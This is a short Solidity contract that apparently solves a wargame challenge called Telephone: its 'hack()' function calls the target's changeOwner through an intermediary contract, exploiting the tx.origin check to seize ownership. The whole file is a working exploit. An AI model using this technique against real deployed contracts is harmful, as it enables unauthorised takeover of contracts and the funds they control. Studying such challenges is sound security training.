// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract ContractSigner {
    Telephone public telephoneInstance;

    constructor(address telephoneContract) {
        telephoneInstance = Telephone(telephoneContract);
    }

    function hack() public {
        telephoneInstance.changeOwner(tx.origin);
    }

    function telephoneOwner() public view returns (address) {
        return telephoneInstance.owner();
    }
}